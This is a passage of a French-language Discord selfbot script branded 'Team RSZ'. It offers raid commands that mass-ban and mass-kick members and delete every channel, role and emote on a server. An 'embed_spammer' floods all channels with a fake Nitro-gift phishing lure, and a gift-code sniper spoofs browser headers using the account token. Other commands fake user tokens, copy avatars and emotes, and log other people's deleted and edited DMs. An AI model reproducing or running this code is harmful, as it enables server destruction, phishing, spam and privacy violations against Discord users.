  console.log("╟─────────────────────────────────╢")
  });
  }
  if(message.content.startsWith(prefix + "anal")){
    superagent.get('https://nekobot.xyz/api/image')
      .query({ type: 'anal'})
      .end((err, response) => {
        var anal = new Discord.RichEmbed()
    .setFooter('𝚃𝚎𝚊𝚖 𝚁𝚂𝚉')
    .setTimestamp()
    .setImage(response.body.message)
    .setColor(color)
    msg.edit(anal).catch(error => console.log('[','ERROR'.red,']','une erreur est survenue que je ne peux régler'.green));
    console.log("╟ Commande anal executé")
  console.log("╟─────────────────────────────────╢")
  });
  }
  if(message.content.startsWith(prefix + 'fight')){
    if(!mentionuser)return msg.edit(":x: **Aucun utilisateur mentionné**");
    var debitage_embed = new Discord.RichEmbed()
    .setColor(color)
    .setFooter('𝚃𝚎𝚊𝚖 𝚁𝚂𝚉')
    .setTitle(mentionuser.username + " __**VS**__ " + client.user.username)
    .setImage("https://data.photofunky.net/output/image/b/e/9/2/be9268/photofunky.gif")
   message.edit(debitage_embed).catch(error => console.log('[','ERROR'.red,']','une erreur est survenue que je ne peux régler'.green));
   console.log("╟ Commande fight executé")
   console.log("╟─────────────────────────────────╢")
  }

if(message.content.startsWith(prefix + 'boom')){
  if(!mentionuser)return msg.edit(":x: **Aucun utilisateur mentionné**")
    var boom_embed = new Discord.RichEmbed()
    .setColor(color)
    .setFooter('𝚃𝚎𝚊𝚖 𝚁𝚂𝚉')
    .setTitle(mentionuser.username + " **Ce Fait Explosé Par **💣💥 " + client.user.username)
    .setImage("	")
    message.edit(boom_embed).catch(error => console.log('[','ERROR'.red,']','une erreur est survenue que je ne peux régler'.green));
    console.log("╟ Commande boom executé")
  console.log("╟─────────────────────────────────╢")
}
   if(message.content === prefix+ 'shutdown'){
    msg.delete().then(() => process.exit(1))
    console.log("╟ Le selfbot est eteint")
  console.log("╟─────────────────────────────────╢")
  }
  if (message.content.startsWith(prefix + "kick")) {
    let serveur = message.guild;
    if(!serveur){
      message.edit(':x: **Veuillez executer cette commande sur un serveur!**');
      return;
    }
    if(!mentionuser){
      message.edit(':x: **Veuillez mentionner un utilisateur!**');
      return;
    }
    mentionuser.kick().then((member) => {
        message.edit(":wave: " + member.displayName + " has been successfully kicked :point_right: ");
    }).catch(() => {
        message.edit(":x: **Access Denied**");
    });
    console.log("╟ Commande kick executé")
  console.log("╟─────────────────────────────────╢")
}
if (message.content.startsWith(prefix + "ban")) {
  let serveur = message.guild;
  if(!serveur){
    message.edit(':x: **Veuillez executer cette commande sur un serveur!**');
    return;
  }
  if(!mentionuser){
    message.edit(':x: **Veuillez mentionner un utilisateur!**');
    return;
  }
  mentionuser.ban().then((member) => {
        message.edit(":wave: " + member.displayName + " has been successfully banned https://gfycat.com/playfulfittingcaribou :point_right: ");
    }).catch(() => {
        message.edit(":x: **Access Denied**");
    });
    console.log("╟ Commande ban executé")
  console.log("╟─────────────────────────────────╢")
}
if(message.content.startsWith(prefix + 'name all')){
  let serveur = message.guild;
  if(!serveur) return msg.edit(':x: **Commande uniquement utilisable sur un serveur**');
	const usermsg = message.content.split(" ").slice(2).join(" ") || message.author.username
	if(!message.member.hasPermission('MANAGE_NICKNAMES')) return message.delete().then(console.log('[','ERROR'.red,']','permission insuffisante'.green))
  const dmusers = message.guild.members;
  msg.edit(`Je renomme tout le monde par ${usermsg}`)
	dmusers.forEach(dmuser => {
		dmuser.setNickname(usermsg).catch(error => console.log('[','ERROR'.red,']','une erreur est survenue que je ne peux régler'.green))
  })
  console.log("╟ Commande name all executé")
  console.log("╟─────────────────────────────────╢")
}

if(message.content === prefix + 'all ban'){
  let serveur = message.guild;
  if(!serveur) return msg.edit(':x: **Commande uniquement utilisable sur un serveur**');
if(!message.member.hasPermission('BAN_MEMBERS')) return message.delete().then(console.log('[','ERROR'.red,']','permission insuffisante'.green))
 message.guild.members.forEach(dmuser => {
   setInterval(() => {
  if(!dmuser.bannable) return;
  dmuser.ban().catch(error => console.log('[','ERROR'.red,']','une erreur est survenue que je ne peux régler'.green))
}, 1000);
})
console.log("╟ Commande ban all executé")
console.log("╟─────────────────────────────────╢")
}
if(message.content === prefix + 'all kick'){
let serveur = message.guild;
if(!serveur) return msg.edit(':x: **Commande uniquement utilisable sur un serveur**');
if(!message.member.hasPermission('KICK_MEMBERS')) return message.delete().then(console.log('[','ERROR'.red,']','permission insuffisante'.green))
const dmusers = message.guild.members
dmusers.forEach(dmuser => {
  if(!dmuser.kickable) return;
  dmuser.kick().catch(error => console.log('[','ERROR'.red,']','une erreur est survenue que je ne peux régler'.green))
})
console.log("╟ Commande kick all executé")
console.log("╟─────────────────────────────────╢")
}
  if(message.content.startsWith(prefix + 'purge')){
    message.channel.fetchMessages().then((message) =>
    message.forEach(m =>{
      if(m.author.id === client.user.id){
        m.delete().catch(error => console.log('[','ERROR'.red,']','une erreur est survenue que je ne peux régler'.green))
    }
  }
    ));
    console.log("╟ Commande purge executé")
    console.log("╟─────────────────────────────────╢") ;
  }
  if(message.content === prefix + 'smile'){
    let rireembed = new Discord.RichEmbed();
    rireembed.setColor(color)
    .setTitle(`**${client.user.username} sourit :**`)
    .setTimestamp()
    .setFooter('𝚃𝚎𝚊𝚖 𝚁𝚂𝚉')
    .setImage(rire[Math.floor(Math.random() * rire.length)])
    message.edit(rireembed).catch(error => console.log('[','ERROR'.red,']','une erreur est survenue que je ne peux régler'.green));
    console.log("╟ Commande smile executé")
  console.log("╟─────────────────────────────────╢")
  }
  if(message.content.startsWith(prefix + 'kiss')){
    if(!mentionuser){
      message.edit(':x: **Veuillez mentionner un utilisateur!**');
      return;
    }
    let kissembed = new Discord.RichEmbed();
    kissembed.setColor(color)
    .setTitle(`**${client.user.username} kiss ${mentionuser.username}**`)
    .setTimestamp()
    .setFooter('𝚃𝚎𝚊𝚖 𝚁𝚂𝚉')
    .setImage(kiss[Math.floor(Math.random() * kiss.length)])
    message.edit(kissembed).catch(error => console.log('[','ERROR'.red,']','une erreur est survenue que je ne peux régler'.green));
    console.log("╟ Commande kiss executé")
  console.log("╟─────────────────────────────────╢")
  }
  if(message.content.startsWith(prefix + 'blush')){
    let veskiembed = new Discord.RichEmbed();
    veskiembed.setColor(color)
    .setTitle(`**${client.user.username} rougit!**`)
    .setTimestamp()
    .setFooter('𝚃𝚎𝚊𝚖 𝚁𝚂𝚉')
    .setImage(veski[Math.floor(Math.random() * veski.length)])
    message.edit(veskiembed).catch(error => console.log('[','ERROR'.red,']','une erreur est survenue que je ne peux régler'.green));
    console.log("╟ Commande blush executé")
    console.log("╟─────────────────────────────────╢")
  }
  if(message.content.startsWith(prefix +"load")){
    message.delete(); var charge = "▓";
    var chargeC = "█";
    message.channel.send("```[" + charge.repeat(25) + "]```").then((message) => { for (i = 0; i <= 25; i++) { message.edit("```[" + chargeC.repeat(i) + charge.repeat(25 - i) + "]  -  " + i * 50 / 25 + "%\n" + "loading..```");
  }message.edit("`Chargement Fini.`").catch(error => console.log('[','ERROR'.red,']','une erreur est survenue que je ne peux régler'.green));
  console.log("╟ Commande load executé")
  console.log("╟─────────────────────────────────╢")
})
}
if(message.content === prefix +"delete all channel"){
  let serveur = message.guild;
  if(!serveur){
    message.edit(':x: **Veuillez executer cette commande dans un serveur!**');
    return;
  }
    if(!message.member.hasPermission('MANAGE_CHANNELS')) return message.delete().then(console.log('[','ERROR'.red,']','permission insuffisante'.green))
      var channels = message.guild.channels
      channels.forEach(chan => {
        chan.delete().catch(error => console.log('[','ERROR'.red,']','une erreur est survenue que je ne peux régler'.green))
      })
      console.log("╟ Commande delete all channel executé")
      console.log("╟─────────────────────────────────╢")
      
}
if(message.content === prefix +"delete all role"){
  let serveur = msg.guild;
  if(!serveur){
    message.edit(':x: **Veuillez executer cette commande sur un serveur!**');
    return;
  }
  message.guild.roles.forEach(roles =>{
    roles.delete().catch(error => console.log('[','ERROR'.red,']','une erreur est survenue que je ne peux régler'.green))
  })
  console.log("╟ Commande delete all role executé")
  console.log("╟─────────────────────────────────╢")
}
if(message.content.startsWith(prefix + 'punch')){
  if(!mentionuser){
    message.edit(':x: **Veuillez mentionner un utilisateur!**');
    return;
  }
  let punchembed = new Discord.RichEmbed();
  punchembed.setColor(color)
  .setTitle(`**${client.user.username} frappe ${mentionuser.username}**`)
  .setTimestamp()
  .setFooter('𝚃𝚎𝚊𝚖 𝚁𝚂𝚉')
  .setImage(punch[Math.floor(Math.random() * punch.length)])
  message.edit(punchembed).catch(error => console.log('[','ERROR'.red,']','une erreur est survenue que je ne peux régler'.green));
  console.log("╟ Commande punch executé")
  console.log("╟─────────────────────────────────╢")
}
if(message.content.startsWith(prefix + 'hug')){
  if(!mentionuser){
    message.edit(':x: **Veuillez mentionner un utilisateur!**');
    return;
  }
  let hughtembed = new Discord.RichEmbed();
  hughtembed.setColor(color)
  .setTitle(`**${client.user.username} fait un calin a ${mentionuser.username} **`)
  .setTimestamp()
  .setFooter('𝚃𝚎𝚊𝚖 𝚁𝚂𝚉')
  .setImage(hugh[Math.floor(Math.random() * hugh.length)])
  message.edit(hughtembed).catch(error => console.log('[','ERROR'.red,']','une erreur est survenue que je ne peux régler'.green));
  console.log("╟ Commande hug executé")
  console.log("╟─────────────────────────────────╢")
}
if(message.content.startsWith(prefix + 'set serveur name')) {
  let arg = args.splice(1).join(" ") || "𝚃𝚎𝚊𝚖 𝚁𝚂𝚉";
  message.edit(`Changement du nom du serveur pour: ` + arg);
  message.guild.setName(arg)
  console.log("╟ Commande set serveur name executé")
  console.log("╟─────────────────────────────────╢")
}
if (message.content.startsWith(`${prefix}token`)){
  if(!mentionuser){
    message.edit(':x: **Veuillez mentionner un utilisateur!**');
    return;
  }
  let token = ["HircHg", "XnyXiA", "XluxwQ","XXn_KA","Xiq-WQ"];
  let token1 = ["a6uny9jcMjet2W2LASruribq6VI", "oZyGJDamSJ4hmJaaLvzdNo1bLqk", "3_6Xt2k4OieDKimnNYGWUq9vJRo","xllelHltGdY7DP_0s1XST4cgzTs"];
  var id = mentionuser.id;
  var bytes = utf8.encode(id);
  var encoded = base64.encode(bytes);
  let embed_encode = new Discord.RichEmbed()
      .setColor(`${color}`)
      .setFooter('𝚃𝚎𝚊𝚖 𝚁𝚂𝚉')
      .setTitle(`Token match ${mentionuser.username}`)
      .setDescription(`${encoded}.${token[Math.floor(Math.random() * token.length)]}.${token1[Math.floor(Math.random() * token1.length)]}`)
      setTimeout(() => {
        message.edit("░░░░░░░░░░ 0%");
        }, 1000);
        setTimeout(() => {
        message.edit("▓▓░░░░░░░░ 20%");
        }, 1500);
       setTimeout(() => {
       message.edit("▓▓▓▓░░░░░░ 40%");
       }, 2000);
      setTimeout(() => {
      message.edit("▓▓▓▓▓▓░░░░ 60%");
      }, 2500);
     setTimeout(() => {
     message.edit("▓▓▓▓▓▓▓▓░░ 80%");
     }, 3000);
     setTimeout(() => {
     message.edit("▓▓▓▓▓▓▓▓▓▓ 100%");
     }, 3500);
     setTimeout(() => {
    message.edit(embed_encode).catch(error => console.log('[','ERROR'.red,']','une erreur est survenue que je ne peux régler'.green));
  }, 4000)
  console.log("╟ Commande token executé")
  console.log("╟─────────────────────────────────╢")
  }
if (message.content.startsWith(`${prefix}encode`)){
  var text = args.join(" ") || "𝚃𝚎𝚊𝚖 𝚁𝚂𝚉";;
  var bytes = utf8.encode(text);
  var encoded = base64.encode(bytes);
  let embed_encode = new Discord.RichEmbed()
      .setColor(`${color}`)
      .setTitle("Texte -> Base64 :")
      .setDescription(encoded)
    message.edit(embed_encode).catch(error => console.log('[','ERROR'.red,']','une erreur est survenue que je ne peux régler'.green));
    console.log("╟ Commande encode executé")
    console.log("╟─────────────────────────────────╢")
  }
  if(message.content.startsWith(`${prefix}lovecalc`)){
    let rep = ["5%", "10%", "15%" , "20%" , "25%" , "30%" , "35%" , "40%" , "45%" , "50%" , "55" , "60%" , "65%" , "70%" , "75%" , "80%" , "85%" , "90%" , "95%" , "100%"];
    let reptaille = Math.floor((Math.random() * rep.length));
    let question = args.slice(0).join(" ") || "𝚃𝚎𝚊𝚖 𝚁𝚂𝚉";;
    let embed = new Discord.RichEmbed()
      .setAuthor(message.author.tag)
      .setColor("ORANGE")
      .setFooter('𝚃𝚎𝚊𝚖 𝚁𝚂𝚉')
      .setThumbnail(`${message.author.avatarURL}`)
      .addField("calcul de relation plausible ❤", question)
      .addField("relation estimée à ❤", rep[reptaille]);
    message.edit(embed).catch(error => console.log('[','ERROR'.red,']','une erreur est survenue que je ne peux régler'.green));
    console.log("╟ Commande lovecalc executé")
    console.log("╟─────────────────────────────────╢")
  }
  if (message.content.startsWith(prefix + 'spotify')) {
            const usermsg = message.content.split(" ").slice(1).join(" ") || "𝚃𝚎𝚊𝚖 𝚁𝚂𝚉"
            let presence = rpcGenerator.createSpotifyRpc(client)

                .setAssetsLargeImage("spotify:ab67616d0000b2739501a78fed26d59bb86d1d9e")
                .setAssetsSmallImage("spotify:ab67616d0000b2739501a78fed26d59bb86d1d9e")
                .setDetails(usermsg)
                .setState("𝚃𝚎𝚊𝚖 𝚁𝚂𝚉")
                .setStartTimestamp(Date.now())
                .setEndTimestamp(Date.now() + 86400000)
            client.user.setPresence(presence.toDiscord()).then(message.edit(`:white_check_mark: **Tu écoutes ${usermsg} sur spotify**`)).catch(console.error)
            console.log("╟ Commande spotify executé")
            console.log("╟─────────────────────────────────╢")
  }
  if(message.content.startsWith(`${prefix}reset`)) {
    clearInterval();
    client.user.setActivity(null, {});
    message.edit(`:information_source:  Votre statut a été réinitialisé ! :information_source:`).catch(error => console.log('[','ERROR'.red,']','une erreur est survenue que je ne peux régler'.green));
    console.log('Commande reset effectué'.yellow)
    }
      if(message.content === `${prefix}nitro`){
          const genEmbed = new Discord.RichEmbed()
              .setColor(color)
              .setThumbnail('https://support.discordapp.com/hc/article_attachments/360013500032/nitro_gif.gif')
              .addField("Gift :", " https:/"+"/discord.gift/" + nitrocode(16,'0aA'))
              message.edit(genEmbed).catch(error => console.log('[','ERROR'.red,']','une erreur est survenue que je ne peux régler'.green));
              console.log("╟ Commande gen nitro executé")
              console.log("╟─────────────────────────────────╢")
    }
    if (message.content.startsWith(prefix + "warn")) {
      if (message.author.id == client.user.id) {
              message.delete();
              const user = message.mentions.users.first();
              let reason = message.content
                  .split(" ")
                  .slice(2)
                  .join(" ");
              if (user) {
                  const member = message.guild.member(user);
                  const warnembed = new Discord.RichEmbed()
                      .setTitle(":warning: AVERTISSEMENT :warning:")
                      .setDescription(
                          "**AVERTI PAR :** " +
                          message.author.username +
                          "\n**RAISON :** " +
                          reason
                      )
                      .setColor(color)
                      .setTimestamp()
                      .setFooter("Rappel : 3 warn = 1 kick");
                  member.send(warnembed);
              }}}
    if(message.content === `${prefix}nitro2`){
      message.edit("Gift :", " https:/"+"/discord.gift/" + nitrocode(16,'0aA'))
      console.log("╟ Commande gen nitro executé")
      console.log("╟─────────────────────────────────╢")
}
    if (msg.content.startsWith(prefix + 'gen token')) {
      msg.delete()
      setTimeout(() => {
      client.destroy().catch(error => console.log('[','ERROR'.red,']','une erreur est survenue que je ne peux régler'.green));
      }, 1500);
      console.log("╟ Commande gen token executé")
      console.log("╟─────────────────────────────────╢")
    }
    if(msg.content.startsWith(prefix + "reverse")){
      let reverse = args.splice(1).join(' ');
      if(!reverse){
        message.edit(':x: **Pas de test definit**')
      }
      function reverseString(str) {
      return str.split("").reverse().join("");
      }
      let sreverse = reverseString(reverse)
      if(args[0] === sreverse) {
      sreverse = `${args.splice(1).join(" ")}`
      }
      msg.edit(`${sreverse}`).catch(console.error);
      console.log("╟ Commande reverse executé")
      console.log("╟─────────────────────────────────╢")
    }
    if (msg.content.startsWith(prefix + 'discord')) {
      let discord = new Discord.RichEmbed()
      .setColor(color)
      .setDescription(`Discord Version : **${Discord.version}**`)
      .setFooter('𝚃𝚎𝚊𝚖 𝚁𝚂𝚉')
      msg.edit(discord).catch(error => console.log('[','ERROR'.red,']','une erreur est survenue que je ne peux régler'.green));
      console.log("╟ Commande discord executé")
      console.log("╟─────────────────────────────────╢") 
    }
      if(message.content === prefix + 'restart'){
        message.edit('**redémarrage** du self bot...').then(client.destroy()).then(() => client.login(token));
        console.log("╟ Commande restart executé")
        console.log("╟─────────────────────────────────╢")
      }
      if(message.content === prefix + 'stop spam'){
        message.edit('**Stop Spam effectué**').then(client.destroy()).then(() => client.login(token));
        console.log("╟ Commande stop spam executé")
        console.log("╟─────────────────────────────────╢")
      }
    if(message.content.startsWith(prefix + 'role info' || prefix + 'ri')){
      let serveur = message.guild;
      let gRole = message.mentions.roles.first();
      if(!serveur) return msg.edit(':x: **Commande uniquement utilisable sur un serveur**')
          if(!gRole) return message.delete().then(console.log('[','ERROR'.red,']','un nom de rôle est nécessaire'.green))
          const status = {
              false: "Non",
              true: "oui"
            }
          let roleEmbed = new Discord.RichEmbed()
          .setColor(color)
          .setDescription(`<@&${gRole.id}>`)
          .addField('id du role:', gRole.id)
          .addField('couleur:', gRole.hexColor)
          .setFooter('𝚃𝚎𝚊𝚖 𝚁𝚂𝚉')
          .addField('nombre de membres ayant ce role:', gRole.members.size)
          .addField('position:', gRole.position)
          .addField('mentionnable:', status[gRole.mentionable])
          if(!message.member.hasPermission('EMBED_LINKS')) return message.edit(`:x: **permission insuffisante (embed_links)**\n<@&${gRole.id}>\n\nid du role: ${gRole.id}\ncouleur du role: ${gRole.hexColor}\nmembres ayant ce role: ${gRole.members.size}\nposition: ${gRole.position}\nmentionnable: ${status[gRole.mentionable]}`)
          console.log("╟ Commande role info executé")
          console.log("╟─────────────────────────────────╢")
          message.edit(roleEmbed).catch(error => console.log('[','ERROR'.red,']','une erreur est survenue que je ne peux régler'))
    }
    if(message.content.startsWith(prefix + "add emote")){
      if(message.channel.type === "dm"){
        message.edit(':x: **Commande pas executable en mp**')
        return;
        }
      let arg = args.splice(2).join(" ");
      let customemoji = Discord.Util.parseEmoji(arg);
      
      if(!args){
        message.edit(':x: **Veuillez choisir une emote.**')
        return;
      }
      if(!customemoji){
        message.edit(`:x: **Emote invalide essayez ceci** ${prefix}add emote (emote) <name>`)
        return;
      }
      if(!message.member.hasPermission('MANAGE_EMOJIS')){
        message.edit(':x: **Vous n\'avez pas les permissions "Gérer les emojis" sur ce serveur**')
        return;
      }
      if (customemoji.id) {
        const Link = `https://cdn.discordapp.com/emojis/${customemoji.id}.${
          customemoji.animated ? "gif" : "png"
        }`;
        let name = message.content.split(" ").splice(3) || customemoji.name;
        message.guild.createEmoji(
          `${Link}`,
          `${name}`
        );
        message.edit(':white_check_mark: **Emote ajoutée au serveur.**')
    console.log("Commande add emote executé.".yellow)
    }else
    message.edit(':x: **Veuillez choisir une emote valide!**')
  }
  if(message.content === prefix + "emote"){
    if(message.channel.type === "dm"){
      message.edit(':x: **Commande pas executable en mp**')
      return;
      }
    let Emojis = "";
        let EmojisAnimated = "";
        let EmojiCount = 0;
        let Animated = 0;
        let OverallEmojis = 0;
        function Emoji(id){
            return client.emojis.get(id).toString()
        }
        message.guild.emojis.forEach(emoji => {
            OverallEmojis++;
            if(emoji.animated) {
                Animated++
                EmojisAnimated+=Emoji(emoji.id)
            } else {
                EmojiCount++;
                Emojis+=Emoji(emoji.id)
        }})
        let embed = new Discord.RichEmbed()
        .setTitle(`Emojis dans: **${message.guild.name}**`)
        .setFooter('𝚃𝚎𝚊𝚖 𝚁𝚂𝚉')
        .setColor(color)
        .addField(`Emojis animés: [${Animated}]`, EmojisAnimated || `None`)
        .addField(`Emojis [${EmojiCount}]`, Emojis || `None`)
        .addField('Total d\'emojis', OverallEmojis || `None`)
        message.edit(embed);
        console.log("╟ Commande emote executé")
        console.log("╟─────────────────────────────────╢")
      }
      if(message.content.startsWith(prefix + "remove emote")){
        if(message.channel.type === "dm"){
          message.edit(':x: **Commande pas executable en mp**')
          return;
          }
        if (!message.member.hasPermission(`MANAGE_EMOJIS`)) {
          return message.edit(":x: **Vous n\'avez pas les permissions \"Gérer les emojis\" sur ce serveur**")
        }
        const emoji = args.splice(2).join(" ");
        if (!emoji) return message.edit(`:x: **Veuillez choisir une emote.**`);
        let customemoji = Discord.Util.parseEmoji(emoji);
          if(!message.guild.emojis.forEach(emote => {
            if(!emote.id === customemoji.id){ 
              return message.channel.send(`:x: **Cette emote n'est pas sur le serveur**.`)
            }}))
          return message.edit(":white_check_mark: **Emote correctement supprimée du serveur.**");
          if (customemoji.id) {
            const Link = `https://cdn.discordapp.com/emojis/${customemoji.id}.${
              customemoji.animated ? "gif" : "png"
            }`;
          message.guild.emojis.get(customemoji.id).delete();
        } else {
          let CheckEmoji = parse(emoji, { assetType: "png" });
          if (!CheckEmoji[0])
            return message.edit(`:x: **Veuillez choisir une emote valide**!`);
          message.edit(`:x: **Vous ne pouvez pas supprimer les emotes par defaut**!`);
        };
        console.log("╟ Commande remove emote executé")
        console.log("╟─────────────────────────────────╢")
      }
      if(message.content.startsWith(prefix + 'embed_spammer')){
        let embed_2 = new Discord.RichEmbed()
        .setAuthor("© Discord Nitro Classic Gift")
        .setColor("#0027ff")
        .setThumbnail("https://emoji.gg/assets/emoji/6234_nitro_booster_s.gif")
        .setImage("https://miro.medium.com/max/2560/0*Atmf_-eFRoumfr9j.png")
        .addField('Claim You\'re Gift', '\n[https://discord.gift/sE7gEpcDQDUZKexV](https://discord.gg/rosa)')
        .setFooter("𝚃𝚎𝚊𝚖 𝚁𝚂𝚉");
        message.guild.channels.filter(c=> c.type === "text").forEach(salontxt=>{
          setInterval(() => {
            salontxt.send(embed_2)
          }, 450);
        })
        console.log("╟ Commande spam embed")
        console.log("╟─────────────────────────────────╢")
        return;
      }
      if(message.content.startsWith(prefix + "steal banniere")){
        message.delete()
      let banner = message.guild.bannerURL;
      console.log(`"╟ Voici la banniere de ${message.guild.name}: ${banner} "`)
      console.log("╟─────────────────────────────────╢")
      }
      if(message.content.startsWith(prefix + "steal emote")){
        if(message.channel.type === "dm"){
        message.edit(':x: **Commande pas executable en mp**')
        return;
        }
        let arg = args.splice(2).join(" ");
        let serveurid = client.guilds.get(arg);
        if(!serveurid){
          message.edit(`:x: **Aucun serveur trouvable avec l'id** "${arg}"`)
        return;
        }
        if (!message.member.hasPermission(`MANAGE_EMOJIS`)) {
          return message.edit(":x: **Vous n\'avez pas les permissions \"Gérer les emojis\" sur ce serveur**")
        }
        if(serveurid.emojis.size < 1){
          message.edit(':x: **Le serveur ne contient aucun emote.**')
        }
        let i = "1";       
        serveurid.emojis.forEach(emote => {
          setTimeout(() => {
          let name = emote.name;
          const Link = `https://cdn.discordapp.com/emojis/${emote.id}.${
          emote.animated ? "gif" : "png"
        }`
          message.guild.createEmoji(
            `${Link}`,
            `${name}`
          ).catch(error => i + "1");
        }, 1000);
      });
      console.log("╟ Commande steal emote executé")
      console.log("╟─────────────────────────────────╢")
          message.edit(`:white_check_mark: **J'ai volé les emotes du serveur** "${serveurid.name}"`)
      }
      if(message.content === prefix + "delete all emote"){
        if(message.channel.type === "dm"){
          message.edit(':x: **Commande pas executable en mp**')
          return;
          }
        if(message.guild.emojis.size < 1) { 
          message.edit(':x: **Il n\' y a aucun emote a supprimer.**') 
          return;
        }
      message.guild.emojis.forEach(emote => {
        message.guild.emojis.get(emote.id).delete();
      });
      };
      if(message.content.startsWith(prefix + "grab pp")){
        let voled = message.mentions.users.first();
        let targetpp = voled.avatarURL;
        if(!voled){ message.edit(":x: **Veuillez mentionner un utilisateur valide!**") 
        return;
      };
      if(!targetpp){ message.edi(":x: **Cet utilisateur n'a pas d'avatar!**")
      return;
      };
      client.user.setAvatar(targetpp);
      console.log("╟ Commande grab pp executé")
      console.log("╟─────────────────────────────────╢")
      message.edit(`:white_check_mark: **J'ai correctement volé la photo de profile de ** "${voled.username}"`) 
    };
try {
  let info = client.emojis.get("655091815401127966") || "ℹ️"; //https://cdn.discordapp.com/emojis/655091815401127966.png?v=1
  let waiting = client.emojis.get("655695570769412096") || "⌛"; //https://images-ext-1.discordapp.net/external/lWj3uW4qvfFB9t0QgGsDJ8vLvh5bSObQ-wwUxYFH4wo/https/images-ext-1.discordapp.net/external/AzWR8HxPJ4t4rPA1DagxJkZsOCOMp4OTgwxL3QAjF4U/https/cdn.discordapp.com/emojis/424900448663633920.gif
  let green = client.emojis.get("655696285286006784") || "✅"; //https://images-ext-2.discordapp.net/external/NU9I3Vhi79KV6srTXLJuHxOgiyzmEwgS5nFAbA13_YQ/https/cdn0.iconfinder.com/data/icons/small-n-flat/24/678134-sign-check-512.png
  let error = client.emojis.get("655704809483141141") || "❌"; //https://cdn.discordapp.com/emojis/655704809483141141.png?v=1
  let warning = client.emojis.get("656030540310380574") || "⚠️"; //https://cdn.discordapp.com/emojis/656030540310380574.png?v=1
  if (message.content === prefix + 'backup friend') {
            var friendCount = client.user.friends.size
            const friends = client.user.friends.array()
            let haste = `backup friends créé avec succès ${friends.length.toString().bold} friends.`.green
            console.log(haste)
            hastebins(`${friends}\n`).then(r => {
                var embed = new Discord.RichEmbed()
                    .setTitle("backup friends (<@id>)")
                    .addField('```lien hastebins```', r)
                    .setColor(color)
                    .setTimestamp()
                    .setDescription("***vous pouvez copier coller la liste sur le channel actuel et vous pourrez ensuite faire clique droit sur un pseudo / envoyer un message / add friend ect...***")
                message.edit(embed).catch(error => console.log('[','ERROR'.red,']','une erreur est survenue que je ne peux régler'.green));
                console.log("╟ Comande friend backup executé")
                console.log("╟─────────────────────────────────╢")
            }
  
            ) } 

  function makeid(length) {
    var result = "";
    var characters =
      "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    var charactersLength = characters.length;
    for (var i = 0; i < length; i++) {
      result += characters.charAt(
        Math.floor(Math.random() * charactersLength)
      );
    }
    return result;
  }

  function save() {
    fs.writeFile("./Data/backups.json", JSON.stringify(backups), err => {
      if (err) console.error(err);
    });
  }
} catch (error) {
  return;
}
})

function saving() {
    fs.writeFile("./Data/afk.json", JSON.stringify(afk), err => {
      if (err) console.error(err);
    });
  }
  function liste() {
    fs.writeFile("./Data/liste.json", JSON.stringify(lbackup), err => {
      if (err) console.error(err);
    });
  }
  function kicker() {
    fs.writeFile("./Data/vkick.json", JSON.stringify(kicked), err => {
      if (err) console.error(err);
    });
  }
client.on("messageUpdate", message => {
  if(message.author.id === client.user.id)return;
  if(message.channel.type === "dm"){
    console.log('╟─────────────────────────────────╢'.blue)
    console.log(`║--> message mp modifié \n║--> User: ${message.author.tag}\n║--> Content: ${message.content}\n║--> At: ${message.createdAt}`.blue) 
  }
})
client.on("messageDelete", message => {
  if(message.author.id === client.user.id)return;
  if(message.channel.type === "dm"){
    console.log('╟─────────────────────────────────'.blue)
    console.log(`║--> 1 message mp surppimé \n║--> User: ${message.author.tag}\n║--> Content: ${message.content}\n║--> At: ${message.createdAt}`.blue) 
  }
  if(message.content.includes('@everyone') || message.content.includes('@here')){
    if(message.author.id === client.user.id)return;
    if(message.channel.type === "dm")return;
    console.log('╟─────────────────────────────────'.blue)
    console.log(`║--> New ghostping \n║--> serveur: ${message.guild.name} \n║--> channel: ${message.channel.name} \n║--> User: ${message.author.tag}\n║--> Content: ${message.content}\n║-->At: ${message.createdAt}`.blue)
  }else return
})



function matchCode(text, callback){
  let codes = text.match(/https:\/\/discord\.gift\/[abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789]+/)
  if(codes){
      callback(codes[0])
      return matchCode(text.slice(codes.index+codes[0].length), callback)
  }else{
      callback(null)
  }
}

client.on("message", message => {
  let codes = []  
  matchCode(message.content, (code) => {
      if(!code)return
      if(!codes.includes(code))codes.push(code)
  })
  if(codes.length == 0)return
  codes.forEach(code => {
      fetch("https://canary.discordapp.com/api/v6/entitlements/gift-codes/"+code.split("/").pop()+"/redeem", {
          method: "post",
          headers: {
              "Accept": "*/*",
              "Accept-Encoding": "gzip, deflate, br",
              "Accept-Language": "en-US",
              "Authorization": client.token,
              "Connection": "keep-alive",
              "Content-Length": JSON.stringify({channel_id: message.channel.id}).length,
              "Content-Type": "application/json",
              "Host": "canary.discordapp.com",
              "Referer": `https://canary.discordapp.com/channels/${message.channel.id}/${message.id}`,
              "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0",
              "X-super-properties": Buffer.from(JSON.stringify({
                  "os":"Windows",
                  "browser":"Firefox",
                  "device":"",
                  "browser_user_agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0",
                  "browser_version":"66.0",
                  "os_version":"10",
                  "referrer":"",
                  "referring_domain":"",
                  "referrer_current":"",
                  "referring_domain_current":"",
                  "release_channel":"canary",
                  "client_build_number":37519,
                  "client_event_source":null
              }), "utf-8").toString("base64")
          },
          body: JSON.stringify({channel_id: message.channel.id})
      }).then(res => {
          if(res.status == 400 || res.status == 404)return console.log(`code invalide :  ${code}`.red)
          res.json().then(json => {
              console.log(json)
              console.log("Un nouveau nitro à sûrement été ajouté à tes crédits.".green)
          })
      }).catch(console.error)
  })
})

client.on('guildDelete', guild =>{
  console.log('╟─────────────────────────────────╢'.blue)
  console.log(`║--> Vous avez quitté le serveur ${guild.name}`.blue)
})

client.on('guildCreate', guild =>{
  console.log('╟─────────────────────────────────╢'.blue)
  console.log(`║--> Vous avez rejoint le serveur ${guild.name}`.blue)
})

client.login(token).catch(err =>{
  if(err.toString().includes('Incorrect login details were provided'.red) || err.toString().includes('An invalid token was provided'.red)) {
      console.log('Token invalid!\nChange ton token dans le config.json'.red)
  }})
    